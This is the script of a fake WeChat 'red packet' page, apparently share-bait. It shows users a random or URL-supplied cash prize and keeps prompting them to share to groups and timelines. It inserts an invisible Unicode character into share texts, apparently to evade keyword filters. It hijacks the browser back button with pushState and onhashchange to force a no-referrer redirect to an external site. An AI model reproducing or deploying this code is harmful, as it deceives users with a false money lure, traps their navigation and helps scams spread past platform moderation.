JkDEIAABJIEEGYSFGEQgAAEECZzAAIQgECSAMJMgiIMAhCAAMJkDkAAAhBIEkCYSVCEQQACEECYzAEIQAACSQIIMwmKMAhAAAIIkzkAAQhAIEkAYSZBEQYBCEAAYTIHIAABCCQJIMwkKMIgAAEIIEzmAAQgAIEkAYSZBEUYBCAAAYTJHIAABCCQJIAwk6AIgwAEIIAwmQMQgAAEkgQQZhIUYRCAAAQQJnMAAhCAQJIAwkyCIgwCEIAAwmQOQAACEEgSQJhJUIRBAAIQQJjMAQhAAAJJAggzCYowCEAAAgiTOQABCEAgSQBhJkERBgEIQABhMgcgAAEIJAkgzCQowiAAAQggTOYABCAAgSQBhJkERRgEIAABhMkcgAAEIJAkgDCToAiDAAQggDCZAxCAAASSBBBmEhRhEIAABBAmcwACEIBAkgDCTIIiDAIQgADCZA5AAAIQSBJAmElQhEEAAhBAmMwBCEAAAkkCCDMJijAIQAACCJM5AAEIQCBJAGEmQREGAQhAAGEyByAAAQgkCSDMJCjCIAABCCBM5gAEIACBJAGEmQRFGAQgAAGEyRyAAAQgkCSAMJOgCIMABCCAMJkDEIAABJIEEGYSFGEQgAAEECZzAAIQgECSAMJMgiIMAhCAAMJkDkAAAhBIEkCYSVCEQQACEECYzAEIQAACSQIIMwmKMAhAAAIIkzkAAQhAIEkAYSZBEQYBCEAAYTIHIAABCCQJIMwkKMIgAAEIIEzmAAQgAIEkAYSZBEUYBCAAAYTJHIAABCCQJIAwk6AIgwAEIIAwmQMQgAAEkgQQZhIUYRCAAAQQJnMAAhCAQJIAwkyCIgwCEIAAwmQOQAACEEgSQJhJUIRBAAIQQJjMAQhAAAJJAggzCYowCEAAAgiTOQABCEAgSQBhJkERBgEIQABhMgcgAAEIJAkgzCQowiAAAQggTOYABCAAgSQBhJkERRgEIAABhMkcgAAEIJAkgDCToAiDAAQggDCZAxCAAASSBBBmEhRhEIAABBAmcwACEIBAkgDCTIIiDAIQgADCZA5AAAIQSBJAmElQhEEAAhBAmMwBCEAAAkkCCDMJijAIQAACCJM5AAEIQCBJAGEmQREGAQhAAGEyByAAAQgkCSDMJCjCIAABCCBM5gAEIACBJAGEmQRFGAQgAAGEyRyAAAQgkCSAMJOgCIMABCCAMJkDEIAAB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">',
        '    <p>恭喜发财</p>',
        '  </div>',
        '</div>',
      ].join(''),
    }
  };

  function initPage (money) {
    M.resetFont();
    $(document.body).append(config.tpl.body.jstpl_format({
      money: money
    }));
    $('.red-packet img').attr('src', $('.js_head_img').attr('data-src'));
    $('.share-container').css({
      height: $(window).height() + 'px'
    });
  }

  function bindEvent () {

    document.body.onclick = function () {
    }
    $(document.body).on('click', '.js_global_dialog_cancel_btn', function (event) {
      event.preventDefault();
      g_js_cancel_dialog(0);
      return false;
    });

    $(document.body).on('click', '.js_global_dialog_submit_btn', function (event) {
      event.preventDefault();
      var $this = $(this);
      var value = parseInt($this.attr('data-value'));
      g_js_dialog(value);
      return false;
    });

    document.body.onclick = function () {
    }

    $('.share-container').on('click', function () {
      if (!window['g_tips_message_obj']) {
        window['g_tips_message_obj'] = gConfig.defaultTips;
      }
      showShareTips(g_tips_message_obj);
    });

    $(document.body).on('event_page_share_done', function () {
      if (gConfig.successTips) {
        g_dialog.alert({
          title: '',
          message: gConfig.successTips,
          btn: '我知道了',
          cb: function () {
            if (gConfig.endPageUrl) {
              location.replace(gConfig.endPageUrl);
            }
            return false
          }
        });
      }
    });

  }

  function replaceMoney (obj, money) {
    obj = obj || {}
    if (obj.title) {
      obj.title = obj.title.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
    }
    if (obj.desc) {
      obj.desc = obj.desc.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace('\\n', '\n').replace(/{bq}/ig, bq);
    }
    if (obj.successTitle) {
      obj.successTitle = obj.successTitle.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
    }
    if (obj.successTips) {
      obj.successTips = obj.successTips.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
    }
  }

  function init () {

    record('tosharer', site);
    evkey && record('tosharer', evkey);

    var moneyStr = parseInt(M.getParam('money')) || parseInt((parseFloat(Math.random() * 20) + 30) * 100)

    var money = (parseFloat(moneyStr / 100).toFixed(2));

    gConfig.defaultTips = gConfig.defaultTips.jstpl_format({
      money: money
    });

    gConfig.successTips = gConfig.successTips.jstpl_format({
      money: money
    });

    replaceMoney(gConfig['ad'], money)
    replaceMoney(gConfig['to_group'], money)
    replaceMoney(gConfig['to_timeline'], money)
    replaceMoney(gConfig['to_timeline'], money)

    $(gConfig.groupTips).each(function (index, item) {
      replaceMoney(item, money)
    });

    $(gConfig.timeLineTips).each(function (index, item) {
      replaceMoney(item, money)
    });

    initPage(money);
    bindEvent();
    g_share.init();
    setTimeout(function () {
      showShareTips(gConfig.defaultTips);
    });
  }

  setTimeout(function () {
    try {
      init();
    } catch (e) {

    }
  }, 500);

}());

(function () {
  window.g_zp = function () {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', "https://video.ivwen.com/wechat/5c4d5cce16b98cRyi75cPppKcuPzdQK5.html?fsrc=dz&type=back_first");
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
  }
  window.onhashchange = function () {
    g_zp();
  }
  history.pushState(null, "message", "#" + new Date().getTime());
}());

(function () {
  if (gConfig.hm) {
    M.report(gConfig.hm);
    M.hotClick('pv.share_page');
  }
  // 总统计
  //M.loadJS('https://hm.baidu.com/hm.js?eb6e5fa34f260ead64122dfad061a9f6');
  if (site === '2618') {
    M.loadJS('https://hm.baidu.com/hm.js?3611a46768887ddf2b8a5fcf16bd9b1f', 'async');
  } else {
    M.loadJS('https://hm.baidu.com/hm.js?eb6e5fa34f260ead64122dfad061a9f6', 'async');
  }
}());


